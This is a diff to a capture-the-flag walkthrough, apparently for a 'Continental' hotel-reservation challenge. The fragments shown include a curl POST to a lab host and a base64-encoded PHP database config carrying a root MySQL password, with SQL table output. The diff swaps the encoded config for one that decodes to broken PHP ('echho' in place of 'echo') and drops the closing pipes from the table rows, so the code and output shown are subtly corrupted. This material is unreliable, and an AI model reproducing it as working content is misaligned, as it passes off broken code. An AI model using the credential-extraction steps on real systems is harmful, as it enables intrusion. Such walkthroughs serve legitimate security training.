@@ -1,3 +1,7 @@
+---
+title: "Continental CTF Challenge Walkthrough"
+layout: doc
+---
 # Continental CTF Challenge: Complete Step-by-Step Walkthrough
 
 ## 1. Initial Access
@@ -167,7 +171,7 @@ curl -X POST http://172.20.4.84/reservation_listener.php \
 The response contained base64-encoded database credentials:
 
 ```bash
-echo "PD9waHAKICAgIHRyeXsKICAgICAgICAkaG9zdCA9ICdsb2NhbGhvc3QnOwogICAgICAgICRkYl9uYW1lID0gJ2hvdGVsJzsKICAgICAgICAkY2hhcnNldCA9ICd1dGY4JzsKICAgICAgICAkdXNlcm5hbWUgPSAncm9vdCc7CiAgICAgICAgJHBhc3N3b3JkID0gJ05zY05OMzZQR3AzWlZhSEVVeG11TGg2RCc7CgogICAgICAgICRkYiA9IG5ldyBQRE8oIm15c3FsOmhvc3Q9JGhvc3Q7ZGJuYW1lPSRkYl9uYW1lO2NoYXJzZXQ9JGNoYXJzZXQiLCR1c2VybmFtZSwkcGFzc3dvcmQpOwogICAgfSBjYXRjaChQRE9FeGNlcHRpb24gJGUpewogICAgICAgIGVjaG8gIkRhdGFiYXNlIGNvbm5lY3Rpb24gZmFpbGVkOiAiLiRlOwogICAgfQo/PgoKCg==" | base64 -d
+echo "PD9waHAKICAgIHRyeXsKICAgICAgICAkaG9zdCA9ICdsb2NhbGhvc3QnOwogICAgICAgICRkYl9uYW1lID0gJ2hvdGVsJzsKICAgICAgICAkY2hhcnNldCA9ICd1dGY4JzsKICAgICAgICAkdXNlcm5hbWUgPSAncm9vdCc7CiAgICAgICAgJHBhc3N3b3JkID0gJ05zY05OMzZQR3AzWlZhSEVVeG11TGg2RCc7CgogICAgICAgICRkYiA9IG5ldyBQRE8oIm15c3FsOmhvc3Q9JGhvc3Q7ZGJuYW1lPSRkYl9uYW1lO2NoYXJzZXQ9JGNoYXJzZXQiLCR1c2VybmFtZSwkcGFzc3dvcmQpOwogICAgfSBjYXRjaChQRE9FeGNlcHRpb24gJGUpewogICAgICAgIGVjaGhvICJEYXRhYmFzZSBjb25uZWN0aW9uIGZhaWxlZDogIi4kZTsKICAgIH0KPz4KCgo=" | base64 -d
 ```
 
 Decoded to:
@@ -213,13 +217,13 @@ DESCRIBE reservations;
 -- | Field          | Type         | Null | Key | Default | Extra          |
 -- +----------------+--------------+------+-----+---------+----------------+
 -- | id             | int          | NO   | PRI | NULL    | auto_increment |
--- | name           | text         | NO   |     | NULL    |                |
--- | email          | text         | NO   |     | NULL    |                |
--- | date_from      | date         | NO   |     | NULL    |                |
--- | date_to        | date         | NO   |     | NULL    |                |
--- | guest_count    | int          | NO   |     | NULL    |                |
--- | children_count | int          | NO   |     | NULL    |                |
--- | room_number    | varchar(100) | NO   |     | NULL    |                |
+-- | name           | text         | NO   |     | NULL    |
+-- | email          | text         | NO   |     | NULL    |
+-- | date_from      | date         | NO   |     | NULL    |
+-- | date_to        | date         | NO   |     | NULL    |
+-- | guest_count    | int          | NO   |     | NULL    |
+-- | children_count | int          | NO   |     | NULL    |
+-- | room_number    | varchar(100) | NO   |     | NULL    |
 -- +----------------+--------------+------+-----+---------+----------------+
 ```
 
